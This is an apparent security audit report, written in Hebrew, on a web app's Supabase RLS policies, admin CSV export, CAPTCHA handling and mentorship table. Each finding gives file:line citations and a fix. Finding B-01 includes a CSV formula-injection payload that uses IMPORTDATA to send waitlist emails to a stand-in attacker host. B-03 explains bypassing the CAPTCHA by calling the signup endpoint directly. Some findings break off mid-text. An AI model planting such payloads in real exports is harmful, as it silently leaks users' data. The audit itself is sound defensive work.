### B-01 · [P1] · שרשרת CSV: קישור אנונימי → waitlist → יצוא אדמין → נוסחה בגיליון

**⚠️ הממצא הזה לא הופיע באף אחד משני דוחות הסוכנים. הוא נמצא במעבר העצמאי.**

**file:line** — `src/components/LandingPage.jsx:514-521` · `:548-549` ·
`supabase/migrations/20260802120000_s1_rls_hardening.sql:90-91` ·
`src/components/AdminPanel.jsx:86-91` · `:604-609`

**מה נמדד — ארבע חוליות, כל אחת מצוטטת:**

1. **קליטה בלי סניטציה.** `LandingPage.jsx:514-521`:
   `const q = new URLSearchParams(window.location.search); return { source: q.get("utm_source"), campaign: q.get("utm_campaign") };`
   ⛔ אפס ולידציה, אפס חיתוך, אפס allowlist.
2. **כתיבה ישירה מהדפדפן.** `:548-549`:
   `.from("waitlist").insert({ email: clean, source: utm.source, campaign: utm.campaign })`
3. **ה-RLS חוסם אורך בלבד.** `20260802120000:90-91`:
   `and (source is null or length(source) <= 64)` — ⛔ **אפס הגבלת תווים.**
   (השוו: `email` **כן** מקבל regex ב-`:88`. ה-regex קיים; הוא פשוט לא הוחל על
   שתי העמודות האחרות.)
4. **היצוא כותב גולמי.** `AdminPanel.jsx:604-609` מייצא במפורש
   `["email", "source", "campaign", "created_at", "approved_at"]`, ו-`escape`
   ב-`:86-91` הוא:
   ```js
   if (/[",\n]/.test(s)) return `"${s.replace(/"/g, '""')}"`;
   ```
   ציטוט RFC-4180 תקין — ⛔ **וחסר-משמעות מול הזרקת נוסחה.** Excel ו-Sheets
   מסירים את הציטוט בפרסינג, ואז מעריכים את התא. תו פותח `=` · `+` · `-` · `@`
   שורד את הציטוט במלואו.

**התוקף אינו צריך את ה-anon key ואינו צריך לגעת ב-PostgREST.** מספיק שיפיץ
`swing-edge.com/?utm_source==IMPORTDATA("https://evil/"&A1)`. **משתמש תמים אחד**
שנרשם דרך הקישור שותל את המטען. ⚠️ ב-Google Sheets משפחת `IMPORT*` נורית
**אוטומטית בפתיחה**, בלי קליק ובלי אזהרה ⇒ הדלפה שקטה של תוכן התאים הסמוכים —
כלומר **רשימת האימיילים של הממתינים**.

**שורש** — ⛔ לא "ה-escape שגוי": ה-escape נכון לתקן שהוא מיישם. השורש הוא
ש**הערך נבדק לאורך במקום לתוכן בשלושת השערים ברצף** (URL → RLS → יצוא), וכל
שער הניח שקודמו בדק.

**התיקון הזול ביותר, לא-הרסני — בשכבת היצוא, ⛔ לא ב-RLS.** ב-`escape`
(`AdminPanel.jsx:86`), אם `/^[=+\-@\t\r]/.test(s)` — הקדם `'` יחיד לפני
הציטוט. שינוי בפונקציה אחת; מכסה **את כל** אתרי היצוא בפאנל בבת אחת (waitlist
ו-trades), כולל אלה שטרם נכתבו.

**⛔ מה אסור בתיקון:**
- ⛔ **אסור** להוסיף regex ל-`source`/`campaign` ב-RLS **כתיקון היחיד**. שורות
  שכבר בטבלה נשארות מורעלות, והיצוא ימשיך להגיש אותן. ה-RLS הוא הידוק נוסף,
  ⛔ לא התיקון.
- ⛔ **אסור** להסיר `source`/`campaign` מרשימת העמודות ביצוא — הן מה שמודד
  איזה קמפיין עובד, וזו הסיבה שהיצוא קיים.
- ⛔ **אסור** להחליף את הציטוט הקיים. הוא נכון ל-RFC-4180 והסרתו שוברת כל שדה
  שמכיל פסיק.

**תלות** — עצמאי. **גובל** ב-B-057 (חסם קצב ל-waitlist) אך ⛔ אינו זהה לו:
throttle מגביל **כמה** שורות מורעלות נכנסות, ⛔ ולא **אם** הן מתפוצצות.

**⚠️ למה P1 ולא P0.** השרשרת דורשת שני צעדים אנושיים שאינם בשליטת התוקף — האדמין
מייצא, והאדמין פותח בגיליון. זה בדיוק "כשל שקט שמתפוצץ בתנאים מסוימים". **אם
יצוא ה-waitlist הוא נוהל שבועי קבוע — זה P0**, כי אז התנאי אינו "מסוים" אלא
מובטח. ⛔ לא נמדד אם הוא קבוע.

### B-02 · [P1] · `feedback` INSERT הוא בדיקת-**צורה** ⇒ שתי תקיפות נפרדות

**file:line** — `supabase/migrations/20260802120000_s1_rls_hardening.sql:56-76`
· `api/notify.js:434-439` · `:211-213`

**מה נמדד — הפרדיקט המלא, מצוטט מהקובץ:**
```sql
create policy feedback_public_insert on public.feedback
  for insert to public
  with check (
    type in ('bug','idea','love','question')
    and message is not null and length(message) between 1 and 5000
    and (user_email is null or length(user_email) <= 255)   -- ⛔ ללא בדיקת פורמט
    and (user_id is null or user_id ~* '^[0-9a-f]{8}-...$') -- ⛔ צורה, לא בעלות
    and coalesce(status,'new') = 'new'

```

### B-03 · [P1] · פסק ה-Turnstile לעולם אינו נקשר להרשמה

**file:line** — `src/components/AuthScreen.jsx:101-120`

**מה נמדד — אומת על ידי קריאת הקובץ, לא מדוח סוכן:**
```js
if (isTurnstileConfigured) {
  try {
    const vr = await fetch("/api/verify-turnstile", { ... body: { token: captchaToken } });
    if (vr.status === 400) { setError(t("errCaptchaFail")); return; }
  } catch { /* fail open */ }
```

`grep -n "captchaToken" src/components/AuthScreen.jsx` → `61`, `97`, `106`
**בלבד**. ⛔ הוא לעולם אינו מגיע ל-`signUp`.

**שורש** — ⛔ לא "שכחו פרמטר". השורש הוא ש**האימות ויצירת החשבון הן שתי קריאות
בלתי-תלויות בלי קשר קריפטוגרפי ביניהן.** ה-CAPTCHA שומר על **ענף ב-JavaScript
של הלקוח**, ⛔ לא על נקודת הקצה שיוצרת חשבון. לקוח שאינו דפדפן קורא ישירות ל-
`/auth/v1/signup` של Supabase ו⛔ לעולם אינו נוגע ב-`/api/verify-turnstile`.
בנוסף `:111-113` נכשל-פתוח בכל מצב שאינו 400.

**התיקון הזול ביותר** — להעביר `options.captchaToken: captchaToken` אל
`signUp`, ולהפעיל Turnstile בהגדרות Auth של Supabase כדי ש-GoTrue **עצמו**
יאמת. הקריאה הקיימת ל-`/api/verify-turnstile` יכולה להישאר כבדיקה מקדימה

### B-04 · [P1] · מנטי יכול לשכתב `mentor_id` בשורת המנטורשיפ של עצמו

**file:line** — `supabase/migrations/20260711120000_mentorship_schema.sql:111-114`

**מה נמדד** — `for update to authenticated using (mentee_id = auth.uid()) with

**רדיוס — ומדוד בדיוק.** ה-`with check` מקבע `mentee_id` לקורא **אחרי** העדכון,

הסטטוס ברשימה המותרת. **טריגר, ⛔ לא מדיניות** — פרדיקט RLS ⛔ אינו יכול להתייחס
ל-`OLD`.

**⛔ מה אסור בתיקון:**
